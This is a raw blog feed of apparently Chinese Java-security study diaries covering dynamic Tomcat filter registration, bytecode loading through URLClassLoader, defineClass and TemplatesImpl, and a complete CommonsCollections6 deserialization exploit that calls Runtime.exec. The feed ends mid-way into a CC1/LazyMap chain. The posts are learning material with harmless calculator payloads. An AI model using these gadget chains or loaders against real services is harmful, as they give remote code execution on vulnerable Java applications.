</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is dynamic Filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ContextListener</span></span><br><span class="line"> FilterRegistration.Dynamic dynamicFilter = servletContext.addFilter(<span class="string">&quot;DynamicFilter&quot;</span>,<span class="keyword">new</span> DynamicFilter());</span><br><span class="line"> dynamicFilter.addMappingForUrlPatterns(<span class="keyword">null</span>,<span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2021/11/27/java_study/java_day8/image-20211204161202213.png" alt="image-20211204161202213"></p><p>参考文章：</p><ul><li><a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></li><li><a href="https://su18.org/post/memory-shell/">https://su18.org/post/memory-shell/</a></li><li><a href="http://c.biancheng.net/view/4005.html">http://c.biancheng.net/view/4005.html</a></li><li><a href="http://bubb1e.com/2021/04/21/Tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter/">http://bubb1e.com/2021/04/21/Tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8Cfilter/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（动态加载字节码）</title>
      <link href="/2021/11/21/java_study/java_day7/"/>
      <url>/2021/11/21/java_study/java_day7/</url>
      
        <content type="html"><![CDATA[<h2 id="day7—动态加载字节码"><a href="#day7—动态加载字节码" class="headerlink" title="day7—动态加载字节码"></a>day7—动态加载字节码</h2><blockquote><p>ClassLoader 是什么呢?它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 java.lang.Runtime 。</p></blockquote><h3 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h3><p><img src="/2021/11/21/java_study/java_day7/image-20211121195009835.png" alt="image-20211121195009835"></p><p><code>URLClassLoader</code>继承于<code>SecureClassLoader</code>，支持从jar文件和文件夹中获取class，继承于<code>ClassLoader</code>，加载时首先去<code>ClassLoader</code>里判断是否由启动类加载器加载过。</p><p>java会根据配置项<code>sun.boot.class.path </code>和 <code>java.class.path </code>中列举到的基础路径（我们设置的ClassPath和从其他途径导入的)</p><p><img src="/2021/11/21/java_study/java_day7/image-20211121211227250.png" alt="image-20211121211227250"></p><ul><li><p>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件</p></li><li><p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件</p></li><li><p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</p></li></ul><p>我们写一个简单Demo来尝试一下使用<code>URLClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UCloader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)&#125;;</span><br><span class="line">        URLClassLoader urlClassLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">        Class test = urlClassLoader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        test.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再生成一个<code>Hello.class</code>，并启动一个http服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/21/java_study/java_day7/image-20211122140338022.png" alt="image-20211122140338022"></p><h3 id="ClassLoader-defineClass加载字节码"><a href="#ClassLoader-defineClass加载字节码" class="headerlink" title="ClassLoader#defineClass加载字节码"></a>ClassLoader#defineClass加载字节码</h3><p>根据官方文档可知，<code>defineClass</code>可以直接从<code>byte</code>中还原出一个Class对象，这种方法可以利用在我们构造payload中</p><p>根据P牛的解释，在家在class文件或者jar文件中都经历三个步骤</p><p><img src="/2021/11/21/java_study/java_day7/image-20211122141727035.png" alt="image-20211122141727035"></p><ul><li><p>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类(这里实际上是双亲委派机 制)，在前面没有找到的情况下，执行 findClass</p></li><li><p>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</p></li><li><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p></li></ul><p>我们来尝试将刚刚的Hello.class采用defineClass加载</p><p>将刚刚生成的Hello.class转换成base64</p><p><img src="/2021/11/21/java_study/java_day7/image-20211124145510856.png" alt="image-20211124145510856"></p><p>我们再使用反射的方式去加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* defineClass</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Method method = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class,<span class="keyword">byte</span>[].class,<span class="keyword">int</span>.class,<span class="keyword">int</span>.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHgoABwAQCQARABIIABMKABQAFQgADAcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAIAAkHABgMABkAGgEABWhlbGxvBwAbDAAcAB0BAAVIZWxsbwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAGAAcAAAAAAAIAAQAIAAkAAQAKAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACwAAAA4AAwAAAAMABAAEAAwABQAJAAwADQABAAoAAAAlAAIAAQAAAAmyAAISBbYABLEAAAABAAsAAAAKAAIAAAAHAAgACAABAA4AAAACAA8=&quot;</span>);</span><br><span class="line">Class Hello = (Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, bytes,<span class="number">0</span>, bytes.length);</span><br><span class="line">Hello.newInstance();</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h3><p>在<code>TemplatesImpl</code>中有一个内部类<code>TransletClassLoader</code>继承了<code>ClassLoader</code></p><p>我们首先寻找一下利用链，根据idea的<code>find usages</code>我们可以查看到哪里被调用,我们由内向外进行推导</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TransletClassLoader#defineClass &lt;- TemplatesImpl#defineTransletClasses &lt;-   TemplatesImpl#getTransletInstance &lt;- TemplatesImpl#newTransformer &lt;-</span><br><span class="line">TemplatesImpl#getOutputProperties</span><br></pre></td></tr></table></figure><p><code>newTransformer，getOutputProperties</code>均为public方法，可以被外部进行调用，尝试加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UCloader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[]code=Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line">TemplatesImpl obj=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">obj.newTransformer();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们一共设置了三个参数<code>_bytecodes,_name,_tfactory</code>我们配合代码一个一个看</p><ul><li><p>_bytecodes:我们在调用的时候会在<code>defineTransletClasse</code>中传给<code>defineClass</code>,所以此参数应该传入我们的字节码<br><img src="/2021/11/21/java_study/java_day7/image-20211124164415424.png" alt="image-20211124164415424"></p></li><li><p>_name:主要是过判断，在<code>getTransletInstance</code>中会判断该参数是否为<code>null</code></p><p><img src="/2021/11/21/java_study/java_day7/image-20211124164547524.png" alt="image-20211124164547524"></p></li><li><p>_tfactory: 在<code>defineTransletClasse</code>中，会调用<code>_tfactory.getExternalExtensionsMap()</code>，所以<code>_tfactory</code>必须有<code>getExternalExtensionsMap()</code>方法，所以我们让<code>_tfactory</code>是<code>TransformerFactoryImpl</code>的对象，这样就可以调用到这个方法，从而不报错</p><p><img src="/2021/11/21/java_study/java_day7/image-20211124165257599.png" alt="image-20211124165257599"></p></li></ul><p>其次，我们生成的字节码的类还需要满足一定的条件，我们所使用的类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类<br>所以我们需要构造一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TempExp</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TempExp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a exp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/11/21/java_study/java_day7/image-20211124170234970.png" alt="image-20211124170234970"></p><h3 id="BCEL-ClassLoader加载字节码"><a href="#BCEL-ClassLoader加载字节码" class="headerlink" title="BCEL ClassLoader加载字节码"></a>BCEL ClassLoader加载字节码</h3><p>fastjson不出网的情况下可以用该方法进行字节码的加载</p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（CommonsCollections6）</title>
      <link href="/2021/11/18/java_study/java_day6/"/>
      <url>/2021/11/18/java_study/java_day6/</url>
      
        <content type="html"><![CDATA[<h2 id="day6—反序列化（CommonsCollections6）"><a href="#day6—反序列化（CommonsCollections6）" class="headerlink" title="day6—反序列化（CommonsCollections6）"></a>day6—反序列化（CommonsCollections6）</h2><p>我们上一篇文章看过了CC1的链，我们继续跟随P牛的进度，来看看CC6，这条链主要是为了解决我们所说的在高版本JDK中无法使用<code>AnnotationInvocationHandler</code>，我们首先还是看一看P牛简化出来的链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">     java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashMap.readObject()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">       </span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                      org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">       </span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">       java.lang.reflect.Method.invoke()</span><br><span class="line">java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们中间还是使用到了<code>transform,LazyMap</code>,在CC1中我们使用的是动态代理去触发<code>AnnotationInvocationHandler#readObject</code>，而JDK8U71以后，无法再使用<code>AnnotationInvocationHandler</code></p><p>可以看到为了触发<code>LazyMap#get</code>，使用到了<code>TiedMapEntry#getValue</code>中的<code>map.get()</code>，而在<code>TiedMapEntry#hashCode</code>中调用了<code>getValue</code>,那么为触发<code>TiedMapEntry#hashCode</code>我们又使用<code>HashMap#hash</code></p><p>,最终在<code>HashMap#readObject</code>中触发</p><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] fakeTransformers = <span class="keyword">new</span> org.apache.commons.collections.Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        TiedMapEntry tie = <span class="keyword">new</span> TiedMapEntry(outerMap,<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        Map newMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        newMap.put(tie,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FileOutputStream baos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line">        ObjectOutputStream oi = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oi.writeObject(newMap);</span><br><span class="line">        oi.close();</span><br><span class="line">        FileInputStream obj = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line">        ObjectInputStream obtest = <span class="keyword">new</span> ObjectInputStream(obj);</span><br><span class="line">        obtest.readObject();</span><br><span class="line">        obtest.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这条链相比CC1好理解很多，如果我们把CC1理解明白这里就不难</p><p>我们主要去理解这里多的一步<code>outerMap.remove(&quot;key&quot;);</code></p><p>我们在<code>lazyMap#get</code>处打断点可以看到并没有进入if语句</p><p><img src="/2021/11/18/java_study/java_day6/image-20211121155853329.png" alt="image-20211121155853329"></p><p>当我们<code>newMap.put(tie,&quot;value&quot;);</code>时，使用到了<code>HashMap#put</code>,在put中也可以触发<code>TiedMapEntry#hashcode</code></p><p>这个时候会有一个完整的调用链，会调用到<code>lazyMap#get</code>，而我们在第一次调用的时候并没有”key”这个键，而<code>lazyMap#get</code>方法会自动帮我们创建这个键，我们可以看到它的介绍，如果key不存在的话，会调用一个<code>put</code>方法，将key放入<code>Map</code>，这也就解释了为什么<code>newMap.put(tie,&quot;value&quot;);</code>后会多出一个<code>key</code>键</p><p><img src="/2021/11/18/java_study/java_day6/image-20211121161147206.png" alt="image-20211121161147206"></p><p><img src="/2021/11/18/java_study/java_day6/image-20211121162417277.png" alt="image-20211121162417277"></p><p>可以很清楚的看出来，当我们执行<code>put</code>后，我们的<code>outermap</code>发生了改变，多出了一个键值对，如果我们不删除该键，反序列化的时候就无法进入进入if语句</p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（lazyMap）</title>
      <link href="/2021/11/16/java_study/java_day5/"/>
      <url>/2021/11/16/java_study/java_day5/</url>
      
        <content type="html"><![CDATA[<h2 id="day5—反序列化-lazyMap"><a href="#day5—反序列化-lazyMap" class="headerlink" title="day5—反序列化(lazyMap)"></a>day5—反序列化(lazyMap)</h2><h3 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h3><p>我们接着跟随P牛学习反序列化。前面P牛给我们介绍了利用<code>TransformedMap</code>去构造<code>CommonCollections1</code>的利用链，但当我们看到<code>ysoserial</code>中时，会发现它并不是利用<code>TransformedMap</code>去构造的，二十利用到了另一个类<code>lazyMap</code>,那我们今天就去学习如何利用<code>lazyMap</code>去构造一个正经的<code>CommonCollections1</code>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; (Transformer)<span class="keyword">new</span> ConstantTransformer(Integer.valueOf(<span class="number">1</span>)) &#125;);</span><br><span class="line">Transformer[] transformers = &#123; (Transformer)<span class="keyword">new</span> ConstantTransformer(Runtime.class), (Transformer)<span 